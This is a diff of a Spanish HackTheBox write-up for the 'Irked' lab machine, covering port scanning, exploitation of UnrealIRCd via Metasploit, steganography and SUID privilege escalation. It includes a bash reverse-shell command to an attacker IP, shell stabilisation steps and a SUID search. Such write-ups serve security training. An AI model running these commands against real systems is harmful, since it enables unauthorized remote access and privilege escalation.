@@ -18,19 +18,19 @@
 
 
 
-	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Irked Machine - HackTheBox">
-	<meta name="twitter:description" content="Esta es una máquina linux de nivel Easy de HackTheBox">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Irked Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina linux de nivel Easy de HackTheBox">
 
 <meta property="og:url" content="https://celero0.github.io/posts/irked/">
-	<meta property="og:site_name" content="Celero0 Blog">
-	<meta property="og:title" content="Irked Machine - HackTheBox">
-	<meta property="og:description" content="Esta es una máquina linux de nivel Easy de HackTheBox">
-	<meta property="og:locale" content="es">
-	<meta property="og:type" content="article">
-		<meta property="article:section" content="posts">
-		<meta property="article:published_time" content="2025-11-25T23:24:58+00:00">
-		<meta property="article:modified_time" content="2025-11-25T23:24:58+00:00">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Irked Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina linux de nivel Easy de HackTheBox">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-25T23:24:58+00:00">
+    <meta property="article:modified_time" content="2025-11-25T23:24:58+00:00">
 
 
 
@@ -55,7 +55,7 @@
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.c170d9bb5caa71f3db9a208ff97e771abf73c1f55b67a1df27ba5666cd49fa9b.css" integrity="sha256-wXDZu1yqcfPbmiCP&#43;X53Gr9zwfVbZ6HfJ7pWZs1J&#43;ps=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -191,7 +191,7 @@
   </a>
 </h1>
 <p><strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.10.117 -oG allPorts
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.10.117 -oG allPorts
 </span></span></code></pre></div><p>En <code>Service Info</code> Podemos ver que nos muestran el nombre de dominio <code>irked.htb</code>
 <img src="/images/Pasted image 20251019210429.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
 <p>Por tanto lo agregaremos a nuestro <code>/etc/hosts</code>
@@ -239,9 +239,9 @@
 <p>Como vimos en el escaneo, tenemos 4 puertos válidos para intentar conectarnos
 <img src="/images/Pasted image 20251019211450.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
 <p>Para conectarnos a IRC utilizaremos la herramienta <code>irssi</code> de la siguiente manera</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>irssi
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>irssi
 </span></span></code></pre></div><p>y luego dentro de la interfaz escribiremos</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/connect 10.10.10.117 <span style="color:#a5d6ff">6697</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/connect 10.10.10.117 <span style="color:#a5d6ff">6697</span>
 </span></span></code></pre></div><img src="/images/Pasted image 20251019212155.png" style="width:100%; height:auto; display:block; margin:auto;">
 y vemos como nos conecta al host, dandonos la versión de IRC que está corriendo en el sistema `Unreal3.2.8.1`
 <img src="/images/Pasted image 20251019212307.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -270,10 +270,10 @@ obteniendo una consola
   </a>
 </h1>
 <p>Primeros nos mandaremos una reverse shell, para salir del metasploit y tratar la tty</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#a5d6ff">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.2/9999 0&gt;&amp;1&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#a5d6ff">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.2/9999 0&gt;&amp;1&#39;</span>
 </span></span></code></pre></div><img src="/images/Pasted image 20251019213156.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Aplicamos los siguientes comandos</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script /dev/null -c bash
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script /dev/null -c bash
 </span></span><span style="display:flex;"><span>ctrl+z
 </span></span><span style="display:flex;"><span>stty raw -echo; fg
 </span></span><span style="display:flex;"><span>reset xterm
@@ -292,7 +292,7 @@ obteniendo una consola
 <img src="/images/Pasted image 20251019213516.png" style="width:100%; height:auto; display:block; margin:auto;">
 Tenemos acceso a todos los directorios, pero no tenemos acceso a leer la <code>user.txt</code></p>
 <p>Para listar todos los archivos de los directorios utilizamos el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la *
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la *
 </span></span></code></pre></div><p>y vemos que hay un archivo llamado <code>.backup</code> en el directorio <code>Documents</code>
 <img src="/images/Pasted image 20251019213920.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
 <h2 id="estenografía">
@@ -306,7 +306,7 @@ Tenemos acceso a todos los directorios, pero no tenemos acceso a leer la <code>u
 <img src="/images/Pasted image 20251019214018.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
 <p>Parece ser la contraseña de un archivo de estenografía, como el único archivo que encontramos es la imagen en el puerto 80, la descargaremos y utilizaremos steghide para probar si guarda algún secreto</p>
 <p>Con la herramineta <code>steghide</code> utilizaremos el siguiente comando para extraer posible información</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
 </span></span></code></pre></div><p>Consiguiente el archivo <code>pass.txt</code>
 <img src="/images/Pasted image 20251019215105.png" style="width:100%; height:auto; display:block; margin:auto;">
 el cual tiene la posible contraseña de <code>djmardov</code>
@@ -321,7 +321,7 @@ el cual tiene la posible contraseña de <code>djmardov</code>
   </a>
 </h1>
 <p>Buscando por archivos SSUID con el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
 </span></span></code></pre></div><p>Nos encontramos con el binario <code>/usr/bin/viewuser</code> que no es binario del sistema, por tanto vemos si su propietario es <code>root</code>
 <img src="/images/Pasted image 20251019215519.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
 <p>Como su propietario es <code>root</code> al ejecutarlo, lo ejecutamos como el usuario <code>root</code>, por tanto lo ejecutaremos para ver que hace
